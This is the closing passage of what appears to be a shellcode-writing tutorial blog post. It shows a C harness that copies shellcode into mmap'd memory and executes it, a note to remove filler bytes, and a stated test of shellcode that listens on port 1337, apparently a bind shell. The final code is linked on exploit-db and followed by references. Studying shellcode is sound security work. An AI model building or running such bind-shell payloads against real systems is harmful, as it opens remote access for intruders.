<span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
	<span class="p">}</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> <span class="cm">/* Memcpy function */</span>
	<span class="n">shellcodetotest</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>	<span class="cm">/* Here we test the shellcode with mmap functions */</span>
	<span class="n">shellcodetotest</span><span class="p">();</span>   <span class="cm">/* Exec the shellcode */</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>      <span class="cm">/* return */</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Remove this part from your shellcode <code class="language-plaintext highlighter-rouge">\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44</code>.</p>

<p>Let’s test!!! Use Shellcode to listen port 1337!!!</p>

<p><img src="/assets/img/headers/shellcode-part-2/shellcode11.png" alt="shellcode" />
<img src="/assets/img/headers/shellcode-part-2/shellcode12.png" alt="shellcode" /></p>

<p>Final code can be found here <a href="https://www.exploit-db.com/exploits/45980">https://www.exploit-db.com/exploits/45980</a>.</p>

<h2 id="references">References!!</h2>
<p><a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe">https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe</a></p>

<p><a href="https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/">https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/</a></p>

<p><a href="https://0x00sec.org/t/linux-shellcoding-part-1-0/289">https://0x00sec.org/t/linux-shellcoding-part-1-0/289</a></p>

<p><a href="https://www.exploit-db.com/papers/35538">https://www.exploit-db.com/papers/35538</a></p>

<p><a href="http://www.vividmachines.com/shellcode/shellcode.html">http://www.vividmachines.com/shellcode/shellcode.html</a></p>

<p><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X">https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X</a></p>

<p><a href="https://www.exploit-db.com/exploits/45980">https://www.exploit-db.com/exploits/45980</a></p>
